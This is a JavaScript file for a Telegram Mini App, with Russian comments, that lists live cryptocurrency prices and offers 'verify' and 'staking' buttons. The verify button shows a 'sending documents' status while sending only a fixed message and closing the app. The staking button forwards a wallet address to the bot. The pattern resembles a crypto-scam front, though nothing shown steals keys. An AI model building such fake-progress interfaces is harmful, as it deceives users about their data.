const tg = window.Telegram.WebApp;
tg.expand();

// Элементы
const verifyBtn = document.getElementById('verifyBtn');
const stakingBtn = document.getElementById('stakingBtn');
const tokensList = document.getElementById('tokensList');

// Уведомления
function showStatus(msg) {
    const s = document.getElementById('status');
    s.textContent = msg;
    s.classList.remove('hidden');
    setTimeout(() => s.classList.add('hidden'), 3000);
}

// Кнопки
verifyBtn.onclick = () => {
    showStatus("⏳ Отправка документов...");
    setTimeout(() => {
        tg.sendData(JSON.stringify({action: "verify", status: "processing"}));
        tg.close();
    }, 1500);
};

stakingBtn.onclick = () => {
    const wallet = document.getElementById('walletInput').value;
    if(wallet.length < 10) return showStatus("❌ Введите адрес");
    tg.sendData(JSON.stringify({action: "staking", wallet: wallet}));
    showStatus("⏳ Подключение...");
    setTimeout(() => tg.close(), 1500);
};

// Загрузка цен
async function getPrices() {
    try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,binancecoin,solana,tron&order=market_cap_desc');
        const data = await res.json();
        tokensList.innerHTML = '';
        data.forEach(coin => {
            const isNeg = coin.price_change_percentage_24h < 0;
            tokensList.innerHTML += `
                <div class="token-row">
                    <img src="${coin.image}" class="token-icon">
                    <div class="token-info">
                        <div class="token-name">${coin.symbol.toUpperCase()}</div>
                        <div class="token-mcap">MCap: ${(coin.market_cap/1e9).toFixed(1)}B</div>
                    </div>
                    <div class="token-stats">
                        <div class="token-price">$${coin.current_price.toLocaleString()}</div>
                        <div class="token-change ${isNeg ? 'neg' : 'pos'}">
                            ${isNeg ? '' : '+'}${coin.price_change_percentage_24h.toFixed(2)}%
                        </div>
                    </div>
                </div>`;
        });
    } catch (e) { tokensList.innerHTML = '<div class="loading">Ошибка сети</div>'; }
}

getPrices();
